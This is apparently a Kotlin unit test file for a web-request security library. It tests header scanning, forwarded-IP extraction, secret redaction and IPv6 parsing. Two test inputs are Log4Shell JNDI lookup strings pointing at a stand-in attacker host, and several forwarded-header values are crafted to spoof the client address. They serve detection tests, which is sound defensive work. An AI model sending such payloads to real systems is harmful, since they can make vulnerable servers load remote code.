package com.guardcore.util

import com.guardcore.util.py.parseAddress

import com.guardcore.protocols.GuardRequest
import com.guardcore.protocols.RequestState
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertNotNull
import kotlin.test.assertNull
import kotlin.test.assertTrue
import kotlinx.coroutines.runBlocking

/**
 * W9i batch 7 (completing): the final util tails to the family 100 percent line gate - the
 * always-scan header shapes of the excluded-header scan, the forwarded-chain rightmost
 * untrusted arm, the client-ip extraction error arm, the hidden-assign dangling redaction, the
 * outer-gate ipv6 parse errors, and the difflib popular-element forward extension.
 */
class UtilW9iTailsTest {
  private class StateBag : RequestState {
    private val attrs = linkedMapOf<String, Any?>()

    override fun getAttr(name: String): Any? = attrs[name]

    override fun setAttr(name: String, value: Any?) {
      attrs[name] = value
    }
  }

  private class HeaderRequest(
      private val headerMap: Map<String, String>,
      override val queryParams: Map<String, String> = emptyMap(),
  ) : GuardRequest {
    override val headers: Map<String, String> = headerMap
    override val clientHost: String? = "192.0.2.10"
    override val urlPath: String = "/"
    override val urlScheme: String = "http"
    override val urlFull: String = "http://example.test/"
    override val method: String = "GET"
    override val state: RequestState = StateBag()
    override val scope: Map<String, Any?> = emptyMap()

    override fun urlReplaceScheme(scheme: String): String = "https://example.test/"

    override suspend fun body(): ByteArray = ByteArray(0)
  }

  // ------------------------------------------------------------------ BodyContentScan

  /**
   * scanExcludedHeaderComponent's always-scan arms: a header NAME that trips the Log4Shell
   * always-scan pattern (154-155), a header VALUE that trips it with the redacted display
   * (159-167), and the effective-categories empty gate (174).
   */
  @Test
  fun `excluded header scan trips always-scan shapes`(): Unit = runBlocking {
    val clientIp = "192.0.2.10"
    // A header whose NAME carries the jndi lookup (the always-scan header patterns).
    val nameHit =
        BodyContentScan.scanExcludedHeaderComponent(
            "\${jndi:ldap://attacker.test/a}",
            "benign-value",
            enabledCategories = setOf("cmd_injection"),
            clientIp,
            "corr-w9i",
            logLevel = "WARNING",
        )
    assertNotNull(nameHit)
    assertTrue(nameHit.first)
    assertTrue(nameHit.second.startsWith("Header name"))

    // A header whose VALUE carries the jndi lookup while the name is clean.
    val valueHit =
        BodyContentScan.scanExcludedHeaderComponent(
            "x-safe-header",
            "\${jndi:rmi://attacker.test/b}",
            enabledCategories = null,
            clientIp,
            "corr-w9i",
            logLevel = "WARNING",
            sensitiveHeaders = setOf("x-safe-header"),
        )
    assertNotNull(valueHit)
    assertTrue(valueHit.first)
    assertTrue(valueHit.second.startsWith("Header 'x-safe-header'"))

    // An address-family excluded header whose only enabled category is the one the
    // header skips: the effective set is empty and the scan returns no hit (174).
    val gated =
        BodyContentScan.scanExcludedHeaderComponent(
            "x-forwarded-for",
            "203.0.113.9",
            enabledCategories = setOf("ssrf"),
            clientIp,
            "corr-w9i",
            logLevel = "WARNING",
        )
    assertNull(gated)
  }

  // ------------------------------------------------------------------ IpExtraction

  private fun configWithTrustedProxy(): com.guardcore.config.SecurityConfig =
      com.guardcore.config.SecurityConfigBuilder()
          .apply {
            enableRedis = false
            trustedProxies = listOf("198.51.100.7")
            trustedProxyDepth = 2
          }
          .build()

  /** The forwarded chain's rightmost untrusted entry failing the candidate checks (153). */
  @Test
  fun `forwarded chain resolves to null on an unparseable rightmost entry`(): Unit = runBlocking {
    val request =
        com.guardcore.core.TestRequest(
            clientHost = "198.51.100.7",
            headers = mapOf("X-Forwarded-For" to "198.51.100.7, definitely-not-an-ip"),
        )
    val resolved = IpExtraction.extractClientIp(request, configWithTrustedProxy())
    // The rightmost untrusted entry is not a candidate; the chain resolves through
    // the trusted connecting IP.
    assertEquals("198.51.100.7", resolved)
  }

  /** Hostile chain entries resolve through the trusted connecting IP. */
  @Test
  fun `client ip extraction survives hostile forwarded chains`(): Unit = runBlocking {
    val hostileChains =
        listOf(
            "198.51.100.7, [::1",
            "198.51.100.7, [::1]:notaport",
            "198.51.100.7, ::1:2:3:4:5:6:7:8:9",
        )
    for (chain in hostileChains) {
      val request =
          com.guardcore.core.TestRequest(
              clientHost = "198.51.100.7",
              headers = mapOf("X-Forwarded-For" to chain),
          )
      val resolved = IpExtraction.extractClientIp(request, configWithTrustedProxy())
      assertEquals("198.51.100.7", resolved, chain)
    }
    // A port-carrying ipv4 entry is port-stripped into a valid candidate.
    val ported =
        IpExtraction.extractClientIp(
            com.guardcore.core.TestRequest(
                clientHost = "198.51.100.7",
                headers = mapOf("X-Forwarded-For" to "198.51.100.7, 1.2.3.4:99999"),
            ),
            configWithTrustedProxy(),
        )
    assertEquals("1.2.3.4", ported)
  }

  // ------------------------------------------------------------------ PairHiddenAssign

  /** The dangling-pair continuation redaction over a percent-encoded run (211-213). */
  @Test
  fun `hidden assign redacts a dangling decoded pair with an adjacent value`() {
    // The decoded run holds a benign leading pair and a sensitive pair whose '='
    // sits at the run end (the empty value at the text end is the dangling flag);
    // the continuation starts with the redactable value.
    val rawRun = "a%3Db%20password%3D"
    val text = rawRun + "sup3rs3cret&next=1"
    val redacted =
        PairHiddenAssign.redactHiddenEncodedPair(
            text,
            runEnd = rawRun.length,
            rawRun = rawRun,
            sensitive = setOf("password"),
        )
    assertNotNull(redacted)
    assertTrue(!redacted.first.contains("sup3rs3cret"), redacted.first)
    assertTrue(redacted.first.contains("a=b"))
  }

  // ------------------------------------------------------------------ PyIp

  /** The outer-gate-passing malformed v6 shapes (400, 441, 444). */
  @Test
  fun `py ip rejects malformed v6 shapes at the inner gates`() {
    for (bad in listOf("1:2:3:4:5:6:7:8:9", ":1:2:3:4:5:6:7", "1:2:3:4:5:6:7:", "1:2:3:4:5:6:7:8:")) {
      try {
        parseAddress(bad)
        throw AssertionError("expected ConfigValidationError for $bad")
      } catch (expected: com.guardcore.errors.ConfigValidationError) {
        // expected
      }
    }
  }

  // ------------------------------------------------------------------ PyDiffLib

  /**
   * findLongestMatch's non-junk forward extension (129): with autojunk the popular element is
   * dropped from b2j, so the DP chain stops at it and the boundary pass extends through it.
   */
  @Test
  fun `difflib extends the best match through a popular element`() {
    val matcher =
        com.guardcore.util.py.SequenceMatcher(
            a = "abc#",
            b = "abc" + "#".repeat(300) + "abc",
        )
    val (besti, bestj, bestsize) = matcher.findLongestMatch(0, 4, 0, 304)
    // The match extends past the initial "abc" through the popular '#'.
    assertTrue(bestsize >= 4, "bestsize=$bestsize")
    assertEquals(0, besti)
    assertEquals(0, bestj)
  }
}
